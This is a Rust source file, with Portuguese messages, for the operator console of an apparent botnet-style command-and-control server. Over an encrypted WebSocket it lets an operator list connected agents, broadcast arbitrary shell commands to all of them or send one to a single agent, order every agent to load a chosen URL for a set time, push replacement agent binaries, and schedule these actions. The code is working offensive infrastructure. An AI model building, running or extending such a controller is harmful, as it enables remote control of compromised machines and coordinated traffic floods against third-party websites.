use crate::handlers::models::{Agent, C2Message, ScheduledTask};
use futures::{SinkExt, StreamExt};
use reqwest::Client;
use serde_json::{Value, json};
use std::fs;
use std::process::Command;
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::sync::mpsc;
use tokio_tungstenite::tungstenite::protocol::Message as WsMessage;
use tokio_tungstenite::{WebSocketStream, connect_async};
use warp::ws::Message;
use uuid::Uuid;
use dotenv::from_filename;
use std::env;
use chacha20poly1305::{
    aead::{Aead, AeadCore, KeyInit, OsRng},
    XChaCha20Poly1305, XNonce,
};
use base64;
use chrono::{DateTime, Utc};
use std::error::Error;
use std::io::{stdout, Write};

type WebSocketWrite = futures::stream::SplitSink<
    WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>,
    WsMessage,
>;

pub struct Operator {
    client: Client,
    ws_sender: mpsc::Sender<Message>,
    response_receiver: mpsc::Receiver<(String, Value, usize, usize)>,
    ws_write: Arc<tokio::sync::Mutex<WebSocketWrite>>,
    operator_key: [u8; 32],
    operator_id: String,
}

impl Operator {
    pub async fn new() -> Result<Self, Box<dyn std::error::Error>> {
        from_filename(".env.op").ok().ok_or("Falha ao carregar o arquivo .env.op")?;
        let server_url = "ws://localhost:80/c2".to_string();
        let operator_id = env::var("OPERATOR_ID")
            .map_err(|_| "OPERATOR_ID não está definido no .env.op")?;
        let token = env::var("OPERATOR_TOKEN")
            .map_err(|_| "OPERATOR_TOKEN não está definido no .env.op")?;
        let operator_key_b64 = env::var("OPERATOR_PRIVATE_KEY")
            .map_err(|_| "OPERATOR_PRIVATE_KEY não está definido no .env.op")?;
        let operator_key = base64::decode(&operator_key_b64)
            .map_err(|_| "Erro ao decodificar OPERATOR_PRIVATE_KEY")?;
        let operator_key: [u8; 32] = operator_key.try_into()
            .map_err(|_| "Tamanho inválido da chave privada (deve ser 32 bytes)")?;

        let client = Client::new();
        let (ws_stream, _) = connect_async(&server_url).await?;
        let (write, mut read) = ws_stream.split();

        let (tx, mut rx) = mpsc::channel::<Message>(100);
        let (response_tx, response_rx) = mpsc::channel::<(String, Value, usize, usize)>(100);

        let ws_write = Arc::new(tokio::sync::Mutex::new(write));
        let ws_write_send = ws_write.clone();
        let ws_write_clone = ws_write.clone();

        let auth_msg = serde_json::to_string(&C2Message::Authenticate {
            operator_id: operator_id.clone(),
            token,
        })?;
        let mut write = ws_write.lock().await;
        write.send(WsMessage::text(auth_msg)).await?;
        drop(write);

        let mut authenticated = false;
        if let Some(Ok(msg)) = read.next().await {
            if msg.is_binary() {
                let data = msg.into_data();
                if data.len() >= 24 {
                    let nonce = XNonce::from_slice(&data[..24]);
                    let ciphertext = &data[24..];
                    let cipher = XChaCha20Poly1305::new(&operator_key.into());
                    if let Ok(plaintext) = cipher.decrypt(nonce, ciphertext) {
                        if let Ok(c2_msg) = serde_json::from_str::<C2Message>(&String::from_utf8(plaintext)?) {
                            match c2_msg {
                                C2Message::AuthResponse { success, message } => {
                                    if success {
                                        authenticated = true;
                                        println!("Autenticação bem-sucedida");
                                    } else {
                                        return Err(format!("Falha na autenticação: {}", message).into());
                                    }
                                }
                                _ => return Err("Resposta inesperada do servidor durante a autenticação".into()),
                            }
                        }
                    }
                }
            } else if let Ok(text) = msg.into_text() {
                if let Ok(c2_msg) = serde_json::from_str::<C2Message>(&text) {
                    match c2_msg {
                        C2Message::AuthResponse { success, message } => {
                            if success {
                                authenticated = true;
                                println!("Autenticação bem-sucedida");
                            } else {
                                return Err(format!("Falha na autenticação: {}", message).into());
                            }
                        }
                        _ => return Err("Resposta inesperada do servidor durante a autenticação".into()),
                    }
                }
            }
        }

        if !authenticated {
            return Err("Falha na autenticação".into());
        }

        tokio::spawn(async move {
            while let Some(msg) = read.next().await {
                match msg {
                    Ok(msg) => {
                        let text = if msg.is_binary() {
                            let data = msg.into_data();
                            if data.len() < 24 {
                                continue;
                            }
                            let nonce = XNonce::from_slice(&data[..24]);
                            let ciphertext = &data[24..];
                            let cipher = XChaCha20Poly1305::new(&operator_key.into());
                            match cipher.decrypt(nonce, ciphertext) {
                                Ok(plaintext) => String::from_utf8(plaintext).unwrap_or_default(),
                                Err(_) => continue,
                            }
                        } else if let Ok(text) = msg.into_text() {
                            text
                        } else {
                            continue;
                        };

                        if let Ok(c2_msg) = serde_json::from_str::<C2Message>(&text) {
                            match c2_msg {
                                C2Message::AgentList {
                                    agents,
                                    total,
                                    online,
                                } => {
                                    let _ = response_tx
                                        .send((
                                            "list".to_string(),
                                            serde_json::to_value(&agents).unwrap_or(json!({})),
                                            total,
                                            online,
                                        ))
                                        .await;
                                }
                                C2Message::AgentStatus { uuid, online } => {
                                    let _ = response_tx
                                        .send((
                                            "status".to_string(),
                                            json!({ "uuid": uuid, "online": online }),
                                            0,
                                            0,
                                        ))
                                        .await;
                                }
                                C2Message::AgentDetails { agent } => {
                                    let _ = response_tx
                                        .send((
                                            "details".to_string(),
                                            serde_json::to_value(&agent).unwrap_or(json!({})),
                                            0,
                                            0,
                                        ))
                                        .await;
                                }
                                C2Message::CommandResponse { output } => {
                                    let _ = response_tx
                                        .send((
                                            "response".to_string(),
                                            json!({ "output": output }),
                                            0,
                                            0,
                                        ))
                                        .await;
                                }
                                C2Message::ScheduledTasks { tasks } => {
                                    let _ = response_tx
                                        .send((
                                            "scheduled".to_string(),
                                            serde_json::to_value(&tasks).unwrap_or(json!({})),
                                            tasks.len(),
                                            0,
                                        ))
                                        .await;
                                }
                                _ => {}
                            }
                        }
                    }
                    Err(e) => {
                        eprintln!("Erro de leitura no WebSocket: {}", e);
                        break;
                    }
                }
            }
            let mut write = ws_write.lock().await;
            let _ = write.close().await;
        });

        tokio::spawn(async move {
            while let Some(msg) = rx.recv().await {
                let ws_msg = if msg.is_binary() {
                    WsMessage::Binary(msg.into_bytes())
                } else if let Ok(text) = msg.to_str() {
                    WsMessage::Text(text.to_string())
                } else {
                    continue;
                };
                let mut write = ws_write_send.lock().await;
                if let Err(e) = write.send(ws_msg).await {
                    eprintln!("Erro ao enviar no WebSocket: {}", e);
                    break;
                }
            }
        });

        Ok(Operator {
            client,
            ws_sender: tx,
            response_receiver: response_rx,
            ws_write: ws_write_clone,
            operator_key,
            operator_id,
        })
    }

    pub async fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let mut stdout = tokio::io::stdout();
        let stdin = BufReader::new(tokio::io::stdin());
        let mut lines = stdin.lines();

        print_banner();
        stdout.write_all(b"\nc2> ").await?;
        stdout.flush().await?;

        loop {
            tokio::select! {
                line = lines.next_line() => {
                    let line = match line? {
                        Some(line) => line.trim().to_string(),
                        None => break,
                    };

                    if line.is_empty() {
                        stdout.write_all(b"\nc2> ").await?;
                        stdout.flush().await?;
                        continue;
                    }

                    let parts: Vec<&str> = line.split_whitespace().collect();
                    match parts[0].to_lowercase().as_str() {
                        "list" => {
                            self.list().await?;
                            tokio::time::sleep(Duration::from_millis(100)).await;
                        }
                        "access" => {
                            if parts.len() == 3 {
                                if let Ok(secs) = parts[2].parse::<u64>() {
                                    self.access(parts[1], secs).await?;
                                } else {
                                    println!("Erro: <secs> deve ser um número.");
                                }
                            } else {
                                println!("Uso: access <url> <secs>");
                            }
                        }
                        "broadcast" => {
                            if parts.len() >= 2 {
                                let cmd = parts[1..].join(" ");
                                self.broadcast(&cmd).await?;
                            } else {
                                println!("Uso: broadcast <cmd>");
                            }
                        }
                        "command" => {
                            if parts.len() >= 3 {
                                let uuid = parts[1].to_string();
                                let cmd = parts[2..].join(" ");
                                self.list().await?;
                                tokio::time::sleep(Duration::from_millis(500)).await;
                                self.command(&uuid, &cmd).await?;
                            } else {
                                println!("Uso: command <uuid> <cmd>");
                            }
                        }
                        "agent-software-update" => {
                            if parts.len() == 3 {
                                let version = parts[1].to_string();
                                let file_path = parts[2].to_string();
                                self.agent_software_update(&version, &file_path).await?;
                            } else {
                                println!("Uso: agent-software-update <version> <file_path>");
                            }
                        }
                        "schedule" => {
                            self.handle_schedule(&parts[1..]).await?;
                        }
                        "scheduled" => {
                            if parts.len() > 1 && parts[1] == "-a" {
                                self.list_scheduled(true).await?;
                            } else {
                                self.list_scheduled(false).await?;
                            }
                        }
                        "cancel" => {
                            if parts.len() != 2 {
                                println!("Uso: cancel <task_id>");
                                continue;
                            }
                            match parts[1].parse::<i32>() {
                                Ok(task_id) => {
                                    let msg = serde_json::to_string(&C2Message::CancelScheduledTask { task_id }).unwrap();
                                    let encrypted = self.encrypt_message(&msg).await?;
                                    self.ws_sender.send(Message::binary(encrypted)).await?;
                                }
                                Err(_) => println!("ID da tarefa deve ser um número inteiro"),
                            }
                        }
                        "clear" => {
                            if cfg!(target_os = "windows") {
                                Command::new("cls").status().expect("Erro ao executar comando.");
                            } else {
                                Command::new("clear").status().expect("Erro ao executar comando.");
                            }
                        }
                        "exit" => {
                            println!("Saindo do shell...");
                            let mut write = self.ws_write.lock().await;
                            if let Err(e) = write.close().await {
                                eprintln!("Erro ao fechar WebSocket: {}", e);
                            }
                            break;
                        }
                        "help" => {
                            println!("Available commands:");
                            println!("  *help                  - Show this help");
                            println!("  *list                  - List all agents");
                            println!("  *access <url> <secs>   - Order agents to access a URL for <secs> seconds");
                            println!("  *broadcast <cmd>       - Send a command to all agents");
                            println!("  *command <uuid> <cmd>  - Send a command to a specific agent");
                            println!("  *agent-software-update <version> <file_path> - Update agent software with binary file");
                            println!("  *schedule <time> [broadcast|access] <args> - Schedule a broadcast or access command in seconds or RFC3339 format");
                            println!("  *scheduled [-a]        - List scheduled tasks (use -a to show all tasks including executed ones)");
                            println!("  *cancel <task_id>      - Cancel a scheduled task");
                            println!("  *clear                 - Clear the terminal");
                            println!("  *exit                  - Exit the shell");
                        }
                        _ => {
                            println!("Unknown command: {}. Type 'help' to see the commands.", parts[0]);
                        }
                    }
                    stdout.write_all(b"\nc2> ").await?;
                    stdout.flush().await?;
                }
                Some((kind, value, total, online)) = self.response_receiver.recv() => {
                    match kind.as_str() {
                        "list" => {
                            let agents: Vec<Agent> = serde_json::from_value(value)
                                .map_err(|e| format!("Erro de desserialização: {}", e))?;
                            for agent in &agents {
                                println!("{}", agent);
                            }
                            println!("\n[+] {total} agentes registrados ({online} online).");
                            stdout.write_all(b"\nc2> ").await?;
                            stdout.flush().await?;
                        }
                        "details" => {
                            if let Ok(agent) = serde_json::from_value::<Option<Agent>>(value) {
                                if let Some(agent) = agent {
                                    println!("Agente encontrado: {}. Digite comandos (digite 'exit' para parar):", agent.uuid);
                                } else {
                                    println!("Agente não encontrado.");
                                }
                            }
                            stdout.write_all(b"\nc2> ").await?;
                            stdout.flush().await?;
                        }
                        // "response" => {
                        //     if let Ok(response) = serde_json::from_value::<Value>(value) {
                        //         if let Some(output) = response.get("output") {
                        //             println!("Saída do comando: {}", output);
                        //         }
                        //     }
                        //     stdout.write_all(b"\nc2> ").await?;
                        //     stdout.flush().await?;
                        // }
                        "cancel" => {
                            if let Ok(response) = serde_json::from_value::<Value>(value) {
                                let success = response.get("success").and_then(|v| v.as_bool()).unwrap_or(false);
                                let message = response.get("message").and_then(|v| v.as_str()).unwrap_or("Unknown response");
                                if success {
                                    println!("[+] {}", message);
                                } else {
                                    println!("[-] {}", message);
                                }
                            }
                            stdout.write_all(b"\nc2> ").await?;
                            stdout.flush().await?;
                        }
                        "scheduled" => {
                            let tasks: Vec<ScheduledTask> = serde_json::from_value(value)
                                .map_err(|e| format!("Erro de desserialização: {}", e))?;
                            self.handle_scheduled_tasks(tasks);
                            stdout.write_all(b"\nc2> ").await?;
                            stdout.flush().await?;
                        }
                        _ => {}
                    }
                }
            }
        }
        Ok(())
    }

    async fn list(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let msg = serde_json::to_string(&C2Message::RequestAgentList)?;
        let encrypted = self.encrypt_message(&msg).await?;
        self.ws_sender.send(Message::binary(encrypted)).await?;
        Ok(())
    }
    async fn list_scheduled(&mut self, show_all: bool) -> Result<(), Box<dyn std::error::Error>> {
        let msg = serde_json::to_string(&C2Message::RequestScheduledTasks { show_all })?;
        let encrypted = self.encrypt_message(&msg).await?;
        self.ws_sender.send(Message::binary(encrypted)).await?;
        if show_all {
            println!("Fetching all scheduled tasks (including executed ones)...");
        } else {
            println!("Fetching pending scheduled tasks...");
        }
        Ok(())
    }

    async fn access(&self, url: &str, secs: u64) -> Result<(), Box<dyn std::error::Error>> {
        if !url.starts_with("http://") && !url.starts_with("https://") {
            return Err("URL inválida: deve começar com http:// ou https://".into());
        }
        let access_cmd = json!({
            "action": "access",
            "url": url,
            "duration_secs": secs
        })
        .to_string();
        let broadcast_msg = serde_json::to_string(&C2Message::Broadcast { cmd: access_cmd })?;
        let encrypted = self.encrypt_message(&broadcast_msg).await?;
        self.ws_sender.send(Message::binary(encrypted)).await?;
        println!("Ordenado a todos os agentes acessarem {} por {} segundos", url, secs);
        Ok(())
    }

    async fn broadcast(&self, cmd: &str) -> Result<(), Box<dyn std::error::Error>> {
        let broadcast_msg = serde_json::to_string(&C2Message::Broadcast {
            cmd: cmd.to_string(),
        })?;
        let encrypted = self.encrypt_message(&broadcast_msg).await?;
        self.ws_sender.send(Message::binary(encrypted)).await?;
        println!("Comando transmitido: {}", cmd);
        Ok(())
    }

    async fn command(&self, uuid: &str, cmd: &str) -> Result<(), Box<dyn std::error::Error>> {
        let command_msg = serde_json::to_string(&C2Message::Command {
            uuid: uuid.to_string(),
            cmd: cmd.to_string(),
        })?;
        let encrypted = self.encrypt_message(&command_msg).await?;
        eprintln!("Operator sending command to {}: {}", uuid, cmd);
        self.ws_sender.send(Message::binary(encrypted)).await?;
        println!("Comando enviado ao agente {}: {}", uuid, cmd);
        Ok(())
    }

    async fn agent_software_update(
        &self,
        version: &str,
        file_path: &str,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let binary = fs::read(file_path)?;
        let msg = serde_json::to_string(&C2Message::AgentSoftwareUpdateWithBinary {
            version: version.to_string(),
            binary,
        })?;
        let encrypted = self.encrypt_message(&msg).await?;
        self.ws_sender.send(Message::binary(encrypted)).await?;
        println!("Comando de atualização de software enviado: versão={}", version);
        Ok(())
    }

    async fn encrypt_message(&self, message: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let cipher = XChaCha20Poly1305::new(&self.operator_key.into());
        let nonce = XChaCha20Poly1305::generate_nonce(&mut OsRng);
        let mut ciphertext = cipher.encrypt(&nonce, message.as_bytes()).unwrap();
        let mut result = nonce.to_vec();
        result.append(&mut ciphertext);
        Ok(result)
    }

    async fn handle_schedule(&mut self, args: &[&str]) -> Result<(), Box<dyn Error>> {
        match args.get(0) {
            Some(&"-a") => {
                let msg = serde_json::to_string(&C2Message::RequestScheduledTasks { show_all: true })?;
                let encrypted = self.encrypt_message(&msg).await?;
                self.ws_sender.send(Message::binary(encrypted)).await?;
                println!("Fetching all scheduled tasks (including executed ones)...");
            }
            Some(&"cancel") => {
                if let Some(task_id_str) = args.get(1) {
                    if let Ok(task_id) = task_id_str.parse::<i32>() {
                        let msg = serde_json::to_string(&C2Message::CancelScheduledTask { task_id })?;
                        let encrypted = self.encrypt_message(&msg).await?;
                        self.ws_sender.send(Message::binary(encrypted)).await?;
                        println!("Cancelling task {}...", task_id);
                    } else {
                        println!("Invalid task ID: {}", task_id_str);
                    }
                } else {
                    println!("Usage: schedule cancel <task_id>");
                }
            }
            Some(&time_str) => {
                if args.len() < 2 {
                    println!("Usage: schedule <time> <command_type> [args_json]");
                    println!("Time can be either:");
                    println!("  - RFC3339 format (e.g. 2024-03-21T15:30:00Z)");
                    println!("  - Number of seconds from now (e.g. 60 for 1 minute)");
                    return Ok(());
                }

                let execute_at = if let Ok(secs) = time_str.parse::<i64>() {
                    // Se for um número, interpreta como segundos a partir de agora
                    Utc::now() + chrono::Duration::seconds(secs)
                } else if let Ok(dt) = DateTime::parse_from_rfc3339(time_str) {
                    // Se for uma string RFC3339, usa diretamente
                    dt.with_timezone(&Utc)
                } else {
                    println!("Invalid time format. Use either:");
                    println!("  - RFC3339 format (e.g. 2024-03-21T15:30:00Z)");
                    println!("  - Number of seconds from now (e.g. 60 for 1 minute)");
                    return Ok(());
                };

                let command = match args[1] {
                    "broadcast" => {
                        if args.len() < 3 {
                            println!("Usage: schedule <time> broadcast <command>");
                            return Ok(());
                        }
                        format!(
                            "schedule {} {} {}",
                            args[1],
                            execute_at.to_rfc3339(),
                            args[2..].join(" ")
                        )
                    }
                    "access" => {
                        if args.len() < 4 {
                            println!("Usage: schedule <time> access <url> <duration_secs>");
                            return Ok(());
                        }
                        format!(
                            "schedule {} {} {} {}",
                            args[1],
                            execute_at.to_rfc3339(),
                            args[2],
                            args[3]
                        )
                    }
                    _ => {
                        println!("Unknown command type: {}. Available types: broadcast, access", args[1]);
                        return Ok(());
                    }
                };

                let msg = serde_json::to_string(&C2Message::Command {
                    uuid: "server".to_string(),
                    cmd: command,
                })?;
                let encrypted = self.encrypt_message(&msg).await?;
                self.ws_sender.send(Message::binary(encrypted)).await?;
                println!("Scheduling task for {}...", execute_at.to_rfc3339());
            }
            None => {
                let msg = serde_json::to_string(&C2Message::RequestScheduledTasks { show_all: false })?;
                let encrypted = self.encrypt_message(&msg).await?;
                self.ws_sender.send(Message::binary(encrypted)).await?;
                println!("Fetching pending scheduled tasks...");
            }
        }
        Ok(())
    }

    fn handle_scheduled_tasks(&self, tasks: Vec<ScheduledTask>) {
        if tasks.is_empty() {
            println!("No scheduled tasks found.");
            return;
        }

        println!("\nScheduled Tasks:");
        println!("{:<5} {:<15} {:<25} {:<10} {}", "ID", "Type", "Execute At", "Status", "Args");
        println!("{}", "-".repeat(80));

        for task in tasks {
            let status = if task.executed { "Executed" } else { "Pending" };
            println!(
                "{:<5} {:<15} {:<25} {:<10} {}",
                task.id,
                task.command_type,
                task.execute_at.to_rfc3339(),
                status,
                task.args
            );
        }
        println!();
    }
}

fn print_banner() {
    println!(
        r#"
                                                          
          @                                               
         @@@@ @                                           
        %@@@@@@@%                                         
         @@@@@@@@@@@                                      
       %%%%@@@@@@@@@@%%%%                                 
        %%%@%%@@@@@@@@@%%%%%        # ##****%             
         %@%%%@@%@@@@@@@@%%%%%  %%%#####%##%#             
           %%%@@@%@@@@@@@@@@@%#%###%%@%%%%%%#*            
            %%%%%%%%%%@@@@@@@@@%#%%@@%%%@@%%@%#           
              %%%%%%%%%@@@@@@@@%%%@%%%%%%@@@@@@#          
              %#%%%%#%%%%%%%%%%%%%%%##%%%@   @@@          
                  *****####%%%%%%%%%##*#%%                
                    *+++***##%%%%%%%##***#                
                   ++++=++*%%%%%%%%%%%%%%%@               
              *****###%###%%%@@@@%%@%###@@@               
             %%@%%%%%%%%%%%%@%@@@@@@@%@@@@%%@@@%%         
            %@@@%@@@%%%@@@@@@%@@@@@@@@@@@@@@@@@@@@        
           %@@@@@@@@@%@@@@@@@@@@@%%          @@ @@        
         %%@@@@% @@@@@@@@@                  @@  @@        
        %%@@@%%@@@@@@@@@@               @@@@@@ @@@        
       %%@@@@@@@@@@@@@%                       @@@         
      %%@@%%@@   @@@@                                     
    %%@@%%%@@   @@@@                                      
   @%%%%%%%@     @@@                                      
   @%@ @%%@       @%@                                     
       %%@         %%%                                    
                     %%%                                  
                                                          
                                                          
                ██▄   ████▄ █▀▄▀█ ▄█    ▄  ▄█ 
                █  █  █   █ █ █ █ ██     █ ██ 
                █   █ █   █ █ ▄ █ ██ ██  █ ██ 
                █  █  ▀████ █   █ ▐█ █ █ █ ▐█ 
                ███▀           █   ▐ █  ██  ▐ 
                              ▀      █  ██    
                              
"#
    );
}